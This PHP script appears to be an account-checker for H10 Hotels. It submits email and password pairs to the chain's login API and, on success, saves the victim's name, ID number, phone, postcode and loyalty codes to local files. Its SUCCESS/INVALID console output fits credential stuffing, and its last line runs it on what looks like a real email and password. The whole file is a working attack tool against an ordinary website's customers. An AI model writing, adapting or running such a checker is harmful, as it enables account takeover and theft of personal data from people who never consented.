<?php
    error_reporting(0);
    function Api($email, $password) {
        $dates = date("d/m/Y | H:i:s");
        $header = [
            'Host: www.h10hotels.com',
            'Cookie: _gcl_au=1.1.1545610760.1701992059; profile=all; visitedweb=true; _fbp=fb.1.1701992068099.1090986444; cookie_consent_user_accepted=true; _gid=GA1.2.151625950.1701992071; __qca=P0-843990737-1701992076506; cookieAvatar=/img/avatar-hombre.png; cookieRedirectDone=true; cookies_policy=12/03/2019 14:25:14; WSS_FullScreenMode=false; opticksid=e48343a19e94e2c56573926eb065b2518e6db452; _ga_J7Z1PQ8ZFC=GS1.1.1702072945.3.1.1702072954.51.0.0; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; _uetsid=294d6420955911ee8add39e5ce18d3ae; _uetvid=294d6610955911ee8a0b27e2f1057159; BookingIDParams=%26fe%3D20231208%26fs%3D20231211%26h%3DHBB%26d%3DLanzarote%26cp%3D%26c%3DWEBH10%26sc%3DWEBH10%26nh%3D1%26h1Ad%3D2%26h1ni%3D0; BookingPrice=0; _ga=GA1.2.1533085570.1701992067; _dc_gtm_UA-1443064-1=1; _ga_WXQCQXFFP2=GS1.1.1702072943.3.1.1702073002.1.0.0',
            'Content-Length: 0',
            'Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"',
            'Accept: application/json, text/plain, */*',
            'Sec-Ch-Ua-Mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
            'Sec-Ch-Ua-Platform: "Windows"',
            'Origin: https://www.h10hotels.com',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: https://www.h10hotels.com/en/lanzarote-hotels/h10-white-suites/rooms',
            'Priority: u=1, i',
        ];
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://www.h10hotels.com/_layouts/15/AjaxController.aspx?Operation=Login&lcid=1033&contrasena=$password&format=json&numeroTarjeta=$email&optional=&type=Login",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_MAXREDIRS => -1,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_CUSTOMREQUEST => "POST"
        ));
        $result = curl_exec($curl);
        $result = json_decode($result, true);
        curl_close($curl);
        if(!$result["errorProduced"]=="Incorrect username or password"){
            $date = date("d/m/Y | H:i:s");
            $info = 'Email: '.$email.' | Senha: '.$password.'  | '.$date."\nCIFDNI: ".$result['CIFDNI']."\nCompany Name: ".$result['CompanyName']."\nCompany Code: ".$result['CompanyCode']."\nNombre Completo: ".$result['NombreCompleto']."\nEmail: ".$result['Email']."\nCodigoClienteClub: ".$result['CodigoClienteClub']."\nCodigoCliente: ".$result['CodigoCliente']."\nNombre: ".$result['Nombre']."\nFull Name: ".$result['Name']." ".$result['LastName']."\nCountry: ".$result["Country"]."\nCodePost: ".$result['CodePost']."\nPhone: ".$result["Phone"]."\nState Club H10: ".$result["StateClubH10"];
            $DateSave = date("d_m_Y");
            $dir = "./key/".$DateSave;
            $file = "./key/".$DateSave."/$email.txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $SaveDoc = fopen($file, "a+");
            fwrite($SaveDoc, $info."\n");
            fclose($SaveDoc);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > H10HOTELS'API < ]  SUCCESS LOGIN: $email | $password | [ $dates ]"."\e[0m\e[0;32;42m [ • ] \e[0m\n";
        }else {
            echo"\e[1;33;43m[ • ] \e[0m\e[0;43m [ > H10HOTELS'API < ]  INVALID LOGIN: $email | $password | [ $dates ]"."\e[0m\e[1;33;43m [ • ] \e[0m\n";
        }
    }
    Api('mariorainy1@gmail.com','Rolandmc909');
?>